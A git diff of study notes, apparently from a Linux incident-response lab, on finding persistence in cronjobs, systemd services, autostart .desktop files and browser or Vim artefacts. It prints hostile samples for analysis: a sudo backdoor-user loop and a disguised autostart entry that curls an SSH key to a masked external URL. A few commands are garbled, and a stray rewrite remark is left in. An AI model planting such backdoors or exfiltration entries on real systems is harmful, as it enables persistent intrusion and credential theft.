@@ -523,49 +523,465 @@ However, we can quickly note that the cronjobs on the system that we identified 
 
 ### Cronjobs Questions
 
-Search around the system for suspicious system-level cronjob entries. What is the full URL of the C2 server?
+> Search around the system for suspicious system-level cronjob entries. What is the full URL of the C2 server?  
 
-List the user-level cronjobs in the system. What is the hidden flag in one of the scripts?
+`:> cat /etc/chron.hourly/beacon`
 
-Use pspy64 to monitor executions occurring through the system. What is the decoded flag value that is echoed every 15 seconds?
+> List the user-level cronjobs in the system. What is the hidden flag in one of the scripts?
+
+`:> cat /home/elija/.flag.sh`  
+
+> Use pspy64 to monitor executions occurring through the system. What is the decoded flag value that is echoed every 15 seconds?
 
 ## Services
 
-In Linux, services refer to various background processes or daemons that run continuously, performing tasks such as managing system resources, providing network services, or handling user requests.  
-For example, the cron daemon we analysed previously ran the cronjobs.  
-Other common services include SSH (`sshd`) for secure shell or the Apache HTTP Server (`httpd`).  
-Typically, services are configured using the system's service management utility - systemd or init.  
-Some environments like BusyBox, however, do not use systemd.
+In Linux, **services** refer to various *background processes* or **daemons** that run continuously, performing tasks such as:
 
-Services can be a target for attackers if they can exploit vulnerabilities, abuse misconfigurations, or manipulate legitimate services to establish persistence or escalate privileges on the system.  
-For example, attackers might create new malicious services or modify existing ones to inject or execute malicious commands during system startup or ad-hoc if they can start and stop the service.
+- managing system resources
+- providing network services
+- handling user requests
 
-As such, incident responders need to have a pre-established baseline to detect anomalies and locate artefacts related to service abuse.
+For example, the `cron` daemon we analysed previously ran the cronjobs. Other common services include **SSH** (`sshd`) for secure shell or the **Apache HTTP Server** (`httpd`).  
+
+Typically, services are configured using the system's service management utility — **systemd** or **init**.  
+Some lightweight environments like *BusyBox*, however, do not use systemd.
+
+> Services can be a target for attackers if they can exploit vulnerabilities, abuse misconfigurations, or manipulate legitimate services to establish **persistence** or escalate privileges on the system.  
+> For example, attackers might create new malicious services or modify existing ones to inject or execute malicious commands during system startup — or ad-hoc if they can start and stop the service.
+
+As such, incident responders need to have a **pre-established baseline** to detect anomalies and locate artefacts related to service abuse.
 
 ### Enumerating Services
 
-#### systemctl  
-
-a utility in Linux used for controlling systemd and service managers.  
-As mentioned earlier, systemd is a service management utility in Unix-based systems and, for the most part, has replaced the traditional init system in many distributions.  
-As such, systemd is responsible for managing the startup processes, services, and daemons on a Linux system, and `systemctl` lets us manage these services directly.
+`systemctl` is a utility in Linux used for controlling **systemd** and service managers. systemd is responsible for managing startup processes, services, and daemons — and `systemctl` lets us manage these services directly.
 
 We can perform a number of actions using `systemctl`, including:
 
-- `systemctl start <service>` — Starts the specified service.
-- `systemctl stop <service>` — Stops the specified service.
-- `systemctl restart <service>` — Restarts the specified service.
-- `systemctl enable <service>` — Enables the specified service to start automatically at boot.
-- `systemctl disable <service>` — Disables the specified service from starting automatically at boot.
-- `systemctl status <service>` — Displays the status of the specified service (e.g., Active, Inactive, Failed).
+1. `systemctl start <service>`   — Starts the specified service  
+2. `systemctl stop <service>`    — Stops the specified service  
+3. `systemctl restart <service>` — Restarts the specified service  
+4. `systemctl enable <service>`  — Enables the service to start automatically at boot  
+5. `systemctl disable <service>` — Disables automatic start at boot  
+6. `systemctl status <service>`  — Displays the status (Active, Inactive, Failed, etc.)
 
-We can also use `systemctl` to iterate and query all the services on the system using the following syntax:
+#### Listing All System Services
 
-##### Listing All System Services**
+`:> investigator@tryhackme:~$ sudo systemctl list-units --all --type=service`
 
-    ```shell-session
-    investigator@tryhackme:~$ sudo systemctl list-units --all --type=service
+This will produce a lot of paginated output. You can exit by pressing `q` or avoid pagination with `--no-pager`.  
+
+#### Listing Running Services
+
+`:> investigator@tryhackme:~$ sudo systemctl list-units --type=service --state=running`  
+
+  UNIT                                           LOAD   ACTIVE SUB     DESCRIPTION
+  accounts-daemon.service                        loaded active running Accounts Service
+  acpid.service                                  loaded active running ACPI event daemon
+  atd.service                                    loaded active running Deferred execution scheduler
+  b4ckd00rftw.service                            loaded active running
+  cron.service                                   loaded active running Regular background
+  ...
+
+The output shows an interesting service: `b4ckd00rftw.service` — which warrants further investigation.
+
+### Investigating Service Processes and Binaries
+
+Now that we have identified a suspicious service, we can use `systemctl` to query the service's status, metadata, and other configurations to understand better what the service is doing.  
+
+#### Viewing the Backdoor Service
+
+`:> investigator@tryhackme:~$ sudo systemctl status b4ckd00rftw.service`  
+
+    b4ckd00rftw.service - Backdoor Service
+        Loaded: loaded (/etc/systemd/system/b4ckd00rftw.service; enabled; vendor preset: enabled)
+        Active: active (running) since Wed 2024-03-13 18:38:06 UTC; 1h 20min ago
+    Main PID: 596 (b4ckd00rftw.sh)
+        Tasks: 2 (limit: 1126)
+        Memory: 6.4M
+        CGroup: /system.slice/b4ckd00rftw.service
+                ├─ 596 /bin/bash /usr/local/bin/b4ckd00rftw.sh
+                ├─4067 sleep 60
+
+In the above output, we gain a lot of details about the **b4ckd00rft**w** service.  
+Notably, we can see that it is in the **Active** and **Running** state, as well as the timestamp for when the service started previously.
+
+The command has also returned the **Main PID** value, which identifies the main process of this service and its associated executable (**b4ckd00rftw.sh**).  
+Moving further, we gain valuable information with the **CGroup** (Control Group) field, which returns two processes spawned from this service.
+
+The first process reveals the absolute path of the service executable script (**/usr/local/bin/b4ckd00rftw.sh**), and the second process reveals that it continually runs every `60 seconds` (sleep 60).  
+
+#### Viewing the Executable Associated with the Backdoor Service  
+
+`:> investigator@tryhackme:~$ cat /usr/local/bin/b4ckd00rftw.sh`
+
+    ```bash
+    #!/bin/bash
+
+    while true; do
+        sudo useradd -m -p $(openssl passwd -1 Password123!) b4ckd00rftw
+        sudo usermod -aG sudo b4ckd00rftw
+        sleep 60
+    done
+    ```
+By dissecting the commands within this script, we can determine that it creates a new user with sudo privileges named **b4ckd00rftw** and then sleeps for **60 seconds** before repeating the process indefinitely.  
+Judging by the contents of this script, it is clear that this is another **persistence mechanism** that the attacker who compromised this system configured to maintain unauthorised access — even if initial response actions (like removing the backdoor user) are performed.  
+This type of persistence is why it's important to perform thorough analysis and restore systems from a known-good backup instead of attempting to remediate on a live system.
+
+### Inspecting Service Configuration Files
+
+Service configuration files, often called unit files in systemd-based Linux distributions, are important for managing and defining services.  
+These files provide systemd with the necessary information to control how a service behaves, including its startup behavior, dependencies, environment variables, and more.  
+In the previous section, we used the systemctl status command to list this configuration data for the backdoor service.  
+By querying the status of a service, the system reads from the unit file to collect this information.
+
+We can read the unit file directly if we know its location, typically in the `/etc/systemd/system/` directory.  
+However, when we queried the status of the service directly, we were given the absolute path of the unit file: `/etc/systemd/system/b4ckd00rftw.service`.  
+
+#### Viewing the Backdoor Service Unit File
+
+`:> investigator@tryhackme:~$ cat /etc/systemd/system/b4ckd00rftw.service`  
+
+
+    [Unit]
+    Description=Backdoor Service
+    After=network.target
+
+    [Service]
+    Type=simple
+    ExecStart=/usr/local/bin/b4ckd00rftw.sh
+    Restart=always
+
+    [Install]
+    WantedBy=multi-user.target
+
+As seen above, we received similar information to what we received by querying the service's status.  
+Notably, the `ExecStart` value gives us the absolute path of the script or binary executed when the service starts.  
+
+### Inspecting Service Logs
+
+Service log files contain valuable information about the activities, status, and errors generated by services on the system.  
+These logs can be valuable for analysts when investigating services during an incident.  
+The easiest way to query and view service logs from the systemd journal (the systemd logging service) is through the `journalctl` command.  
+
+#### Viewing the Backdoor Service Logs (real-time tail)
+
+`:> investigator@tryhackme:~$ sudo journalctl -f -u b4ckd00rftw.service`  
+
+    -- Logs begin at Sun 2022-02-27 13:52:14 UTC. --
+
+    Mar 13 20:03:33 tryhackme sudo[4177]:     root : TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/usr/sbin/useradd -m -p $1$wBUkwyjH$cTZA1K8hQqW6Spxf/en/I/ b4ckd00rftw
+    Mar 13 20:03:33 tryhackme sudo[4177]: pam_unix(sudo:session): session opened for user root by (uid=0)
+    Mar 13 20:03:33 tryhackme b4ckd00rftw.sh[4178]: useradd: user 'b4ckd00rftw' already exists
+    ...
+    Mar 13 20:03:33 tryhackme b4ckd00rftw.sh[596]: THM{********************************}
+
+> To exit real-time following, press **Ctrl + C**.
+
+In the above output, we continuously monitor and display new log entries related to the b4ckd00rftw.service unit in real time.  
+As seen in the output, we receive some details on the various actions performed by the service, such as the useradd command, which is part of the service binary we investigated earlier, along with correlated timestamps.  
+
+>Note that if you do not want to follow the logs in real time, you can omit the `-f` argument.
+
+Inspecting a service's logs quickly can be useful for troubleshooting.  
+When responding to incidents, service logs can be extremely helpful in identifying unexpected behaviour or malicious executions in real time.  
+
+### SErvices Questions
+
+1. List all running services on the system. What is the flag you discover in the backdoor service's **description**?  
+2. View the `journalctl` logs associated with the backdoor service. What is the flag you discover?
+
+This version uses many Markdown features intentionally while keeping the content faithful to the original and well-structured.
 
 ## Autostart Scripts
 
+Autostart scripts, as the name implies, are scripts or commands executed automatically when a system boots up or a user logs in.  
+These scripts are typically used to launch certain programs or commands automatically without manual intervention on login.
+
+User-specific autostart scripts differ from cronjobs and services in that they are tailored to run tasks upon system startup or user login rather than at scheduled intervals like cronjobs or continuously like services.  
+They are crucial in automating the initialisation process of various applications or utilities, ensuring that essential components are up and running without requiring manual intervention.
+
+There are generally two types of autostart scripts in Linux systems:
+
+### System-wide autostart scripts
+
+These scripts are executed when the operating system boots up before users log in.  
+They are often found in directories like `/etc/init.d/`, `/etc/rc.d/`, or `/etc/systemd/system/`.  
+System-wide autostart scripts are typically used to start system services or daemons, similar to the unit files covered in the previous task.
+
+### User-specific autostart scripts
+
+These scripts are executed when a user logs into their account.  
+They are usually found in directories like `~/.config/autostart/` or `~/.config/` (under various subdirectories).  
+User-specific autostart scripts are commonly used to launch user-specific programs or applications upon login.
+
+Attackers can target autostart scripts for various reasons.  
+If an attacker can modify or create autostart scripts, they may be able to abuse this to achieve persistence, install backdoors, disguise malware, or execute privileged commands.  
+For example, by injecting malicious commands or binaries to autostart scripts, attackers can execute a reverse shell in the context of a service account or a user, or abuse permissions to escalate privileges.  
+As such, analysts need to be able to review and harden autostart scripts to detect anomalies and prevent abuse.  
+
+### Identifying System Autostart Scripts
+
+* **/etc/init.d/**  
+  This directory typically contains scripts for system service management in traditional SysV init systems and is primarily responsible for starting, stopping, restarting, and managing system services.  
+  Each script corresponds to a specific service and follows a standardised naming convention.  
+  For example, you might find scripts like `apache2`, `mysql`, or `ssh`, which control the Apache web server, MySQL database server, and OpenSSH server, respectively.  
+  These scripts are usually written in Bash or another shell scripting language.
+
+* **/etc/systemd/system/**  
+  This directory is related to the systemd init system, which has become the default init system in many modern Linux distributions.  
+  As discussed in the previous task, services are defined by unit files stored in this directory.  
+  They specify various parameters and actions related to a service, such as its dependencies, startup behaviour, environment variables, and more.  
+  For example, we can identify the `b4ckd00rftw.service` unit file in `/etc/systemd/system/b4ckd00rftw.service`, another way to investigate potentially malicious or altered services.
+
+### Identifying User Autostart Scripts
+
+Many desktop environments place autostart scripts in the user's home directory.  
+As such, they can be a hiding spot for user-targeted malware.  
+Accessing other users' home directories typically requires elevated privileges, such as using `sudo` or `su` commands.  
+As an investigator, you would need appropriate permissions to access these directories.  
+In this case, the investigator user is in the sudoers group.
+
+* **~/.config/autostart/**  
+  The autostart scripts' syntax is usually in the form of `.desktop` files, which are plain text files with a specific format.  
+
+  For example, suppose a user wants to automatically launch a custom script that sets up their development environment upon logging into their Linux desktop.  
+  They've written a shell script named `setup_dev_env.sh`, located in their home directory, that updates necessary dependencies, sets up environment variables, and launches their IDE and code editor applications.  
+  To automate this process, they can create a `.desktop` file inside `~/.config/autostart/` with the following content:
+
+  **Example .desktop File**
+
+    [Desktop Entry]
+    Type=Application
+    Name=Setup Development Environment
+    Exec=/bin/bash -c "/home/eduardo/setup_dev_env.sh"  
+
+To break down the important syntax of this file in more detail:
+
+* `[Desktop Entry]`: This is the standard file header indicating a desktop autostart file.
+* `Name=Setup Development Environment`: The name of the autostart entry.
+* `Exec=/bin/bash -c "/home/eduardo/setup_dev_env.sh"`: The command to execute on startup. Here, `/bin/bash -c` executes the `setup_dev_env.sh` script using Bash.
+
+During an investigation of this nature, we should quickly list the autostart scripts for all users on the system.  
+Once we identify any entries, we should analyse them further to see what scripts or commands they are performing.   
+To do so, we can run a command like:
+
+#### Enumerating User Autostart Scripts
+
+`:> investigator@tryhackme:~$ ls -a /home/*/.config/autostart`  
+
+    /home/eduardo/.config/autostart:
+    .  ..  dev.desktop
+    /home/janice/.config/autostart:
+    .  ..  keygrabber.desktop
+
+
+From the above output, we have identified a couple of entries. Specifically, `keygrabber.desktop` under Janice's home directory looks interesting.  
+To view the contents of the autostart entry, we can `cat` the file:
+
+#### Viewing Janice's Autostart Script
+
+`:> investigator@tryhackme:~$ cat /home/janice/.config/autostart/keygrabber.desktop`  
+
+    [Desktop Entry]
+    Type=Application
+    Name=Standard Desktop Configuration (DO NOT MODIFY)
+    Exec=/bin/bash -c "curl -X POST -d '/home/janice/.ssh/id_rsa' http://.****--./_***"
+
+
+After analysing the configuration script, it's safe to say we found another persistence method.  
+Specifically, the script uses the `curl` command under the `Exec` entry to issue a POST request to an external URL.  
+More interestingly, however, the contents of `/home/janice/.ssh/id_rsa` are being sent to the server via the POST request.  
+The `id_rsa` file is Janice's private SSH key and should never be shared, as anyone with the key can connect as Janice to the host.
+
+This configuration suggests that upon startup, it will execute a `curl` command to send the contents of Janice's SSH private key (`id_rsa` file) to an attacker-controlled endpoint.
+
+Other user-related configuration files that should be investigated include:
+
+* `~/.bash_history`: This file contains a history of commands executed by the user in the Bash shell, providing insights into their activities and commands executed.  
+
+* `~/.ssh`: This directory contains SSH-related files, including a user's SSH keys (`id_rsa`, `id_rsa.pub`), `known_hosts`, and `authorized_keys`.  
+  
+* `~/.profile`: This file typically contains user-specific initialisation commands and settings for their shell environment, and similar to autostart scripts, could contain malicious commands.  
+
+* **Message of the Day (MOTD)**: While not directly a user-configured file, the Message of the Day is the message that is presented to the user when a user connects to a Linux server via SSH or a serial connection. Linux systems contain several default MOTD files in the `/etc/update-motd.d/` and `/usr/lib/update-notifier/` directories. Like autostart scripts, attackers can create malicious MOTD files that grant them persistence onto the target every time a user connects to the system by executing a backdoor script or command.
+
+### Autostart Script Questions
+
+>What is the full URL that receives Janice's private SSH key on system startup?  
+
+
+
+>Identify and investigate the remaining `.desktop` files on the system. What is the command that executes with the Show Network Interfaces autostart script?
+
 ## Application Artefacts
+
+During live incident investigations, analysing application artefacts can provide valuable insights into user activities, system usage patterns, and potential security concerns.  
+Application artefacts encompass the data generated and stored by applications during their operation, including configuration files, logs, cache files, and other user-specific data.
+
+Understanding and analysing these artefacts can aid forensic investigators in reconstructing events, identifying anomalies, and determining the impact of the incident.  
+
+A good first step in application artefact analysis is determining which applications or programs have been installed on the system.  
+This can be achieved by running the `dpkg -l` command. This command will list all installed packages along with their versions:  
+
+**Listing All dpkg Installed Packages** : `:> investigator@tryhackme:~$ sudo dpkg -l`  
+
+**Note**: this method will only list applications and programs installed through the system's package manager.  
+Unfortunately, there is no surefire way to list manually installed programs and their components generally, which often requires more manual file system analysis.  
+
+### Vim  
+
+Vim is a popular text editor that is included with most UNIX systems.  
+It can sometimes leave behind artefacts that can be valuable in forensic investigations.  
+Among these artefacts, the `.viminfo` file stands out as it contains important information about user interactions within Vim sessions.  
+For instance, modifications to scripts or configuration files stored within Vim can be detected, shedding light on potential unauthorised access or tampering by an attacker.  
+Additionally, the command history stored in `.viminfo` provides a chronological record of commands executed by users and can be a valuable resource for reconstructing user activities.
+  
+#### Finding .viminfo Files  
+
+`:> investigator@tryhackme:~$ find /home/ -type f -name ".viminfo" 2>/dev/null`  
+
+    /home/janice/.viminfo
+    /home/ubuntu/.viminfo  
+
+Putting it all together, the above command searches for files named `.viminfo` starting from the home directory (`/home`).  
+`2>/dev/null` is a common method to suppress any error messages that might occur during the search and give us a clean output.  
+Since Janice is one of our users of interest, we can analyse the file in more detail by reading its contents:  
+
+#### Viewing Janice's .viminfo File
+
+`:> investigator@tryhackme:~$ sudo cat /home/janice/.viminfo`
+
+    # This viminfo file was generated by Vim 8.1.
+    # You may edit it if you're careful!
+
+    # Viminfo version
+    |1,4
+
+    ...
+    # Last Search Pattern:
+    ~MSle0~/
+
+    # Command Line History (newest to oldest):
+    :q
+    |2,0,1710339077,,"q"
+    ...
+
+As seen in the above output, several artefacts of information are stored in this file by default, including the Vim version, the encoding, the latest search pattern, command-line history, and more.  
+Additional text editor artefacts you may come across include `.nano_history` with `Nano` or `.emacs` or `.emacs.d` with `Emacs`, among others.  
+
+### Browser Artefacts
+
+Web browsers installed on a system, such as Mozilla Firefox and Google Chrome, generate artefacts that can provide insights into user behaviour and activities.  
+These artefacts include browser histories, download logs, and stored cookies.  
+Analysing browser histories and download logs can reveal websites visited, files downloaded, and potentially malicious URLs accessed by the user.  
+For example, `Firefox` organises user data within profile directories, often found in `~/.mozilla/firefox/`.  
+Google `Chrome` typically stores user profiles (history, web data, login databases, etc.) in `~/.config/google-chrome/`.  
+Similar to our method with `.viminfo`, we can quickly list out the browser directories within the workstation's `/home` folder.
+
+#### Finding Browser Artefact Directories
+
+`:> investigator@tryhackme:~$ sudo find /home -type d $$   -path "*/.mozilla/firefox" -o -path "*/.config/google-chrome"   $$ 2>/dev/null`  
+
+    /home/ubuntu/.mozilla/firefox
+    /home/eduardo/.mozilla/firefox  
+
+As seen in the output above, we have identified two potential locations of browser artefacts.  
+The next step in our analysis is identifying the profile we need to analyse.  
+
+#### Listing Firefox Profiles
+
+`:> investigator@tryhackme:~$ sudo ls -al /home/eduardo/.mozilla/firefox`  
+
+    total 32
+    drwx------  6 eduardo eduardo 4096 Mar 13 14:44  .
+    drwx------  4 eduardo eduardo 4096 Mar 13 14:44  ..
+    drwx------  3 eduardo eduardo 4096 Mar 13 14:44 'Crash Reports'
+    drwx------  2 eduardo eduardo 4096 Mar 13 14:44 'Pending Pings'
+    -rw-r--r--  1 eduardo eduardo   62 Mar 13 14:44  installs.ini
+    drwx------  2 eduardo eduardo 4096 Mar 13 14:44  lwvdnf29.default
+    drwx------ 13 eduardo eduardo 4096 Mar 13 15:17  niijyovp.default-release
+    -rw-r--r--  1 eduardo eduardo  259 Mar 13 14:44  profiles.ini
+
+There are two profiles: `lwvdnf29.default` and `niijyovp.default-release`.  
+The `.default` file is related to legacy configurations, so we can focus our efforts on the `.default-release` file.
+In addition to manual inspection of browser artefacts, we can utilise specialised tools for more efficient and comprehensive analysis.  
+Forensic tools like **Dumpzilla**, for instance, are designed to parse and extract valuable information from browser artefacts, providing investigators with a structured overview of user activity.  
+**Dumpzilla** can parse data from various web browsers and allow us to analyse browsing histories, bookmarks, download logs, and other relevant artefacts in a streamlined manner.  
+We have already retrieved the dumpzilla.py script, which can be found in /home/investigator/dumpzilla.py.  
+Since browser profiles can contain potentially sensitive data (like cookies and passwords), we must use sudo to read profiles with elevated privileges.  
+
+#### Using Dumpzilla.py
+
+`:> investigator@tryhackme:~$ sudo python3 /home/investigator/dumpzilla.py /home/eduardo/.mozilla/firefox/niijyovp.default-release --Summary --Verbosity CRITICAL`
+
+    ==================
+    Total Information
+    ==================
+
+    Total Addons (URLS/PATHS)  : 3
+    Total Addons               : 0
+    Total Bookmarks            : 10
+    Total Cookies              : 34
+    Total Directories          : 0
+    Total Downloads history    : 1
+    Total Search Engines       : 6
+    Total Forms                : 0
+    Total History              : 14
+    Total Public Key Pinning   : 9
+    Total Permissions          : 4
+    Total Preferences          : 162
+    Total Sessions             : 0  
+
+The profile has several bookmarks, cookies, and history that we can extract. By running the `--Help` argument, we can list the available extraction options.  
+Some of the most useful ones include:  
+
+#### Dumpzilla.py Sample Options
+
+    --Addons
+    --Search
+    --Bookmarks
+    --Cookies
+    --Downloads
+    --History  
+
+To extract the stored Cookies, we can run the following command:  
+
+#### Extracting Cookies with Dumpzilla.py  
+
+`:> investigator@tryhackme:~$ sudo python3 /home/investigator/dumpzilla.py /home/eduardo/.mozilla/firefox/niijyovp.default-release --Cookies`
+
+    =======
+    Cookies              
+    =======
+    => Source file: /home/eduardo/.mozilla/firefox/niijyovp.default-release/cookies.sqlite
+    => SHA256 hash: f69caa997d098901992cfdd1c74c1d618d380a47f755b98539e8ec5dbb2efe3b
+
+    Host: www.mate-look.org
+    Name: __ocs_id
+    Value: ohdsjfhnrb6c8ae8rg02ha0aj5
+    Path: /
+    Expiry: 2022-03-29 16:40:22
+    Last Access: 2022-02-27 16:42:53
+    Creation Time: 2022-02-27 16:40:22
+    Secure: No
+    HttpOnly: Yes
+    ...  
+
+**Dumpzilla** can help us uncover artefacts such as data that has been exfiltrated, stolen cookies, forms that may have been submitted, or potential contact with C2 servers.  
+In conclusion, leveraging specialised forensic tools like Dumpzilla offers a more efficient and automated approach to analysing browser artefacts.  
+
+### Additional Artefacts
+
+Additional application-related artefacts that may be useful to collect during an investigation depend on the type and purpose of the system.  
+For instance, artefacts related to email clients, word processing software, and terminal multiplexers like Screen or Tmux can provide valuable insights into a workstation.  
+Email client artefacts may include configuration files and message stores, while word processing artefacts may encompass recently accessed documents and temporary files.  
+A web server's crucial artefacts may include web server logs, configuration files, and web application logs, which could contain information about accessed URLs, user agents, and server responses.   Additionally, CMS artefacts, such as WordPress databases or Joomla configuration files, may offer insights into web application activity.  
+Similarly, artefacts such as database logs, configuration files, and SQL query logs on a database server may be useful in detailing database access and executed queries.  
+Overall, understanding and enumerating the specific applications and services running on a system is paramount to identifying relevant artefacts for investigation.  
+
+### Application Artefact Questions
+
+>Analyse Janice's .viminfo log. What flag do you find within the Vim search history?  
+
+
+>Use DumpZilla to investigate Eduardo's Firefox bookmarks. What flag do you find in one of the entries?
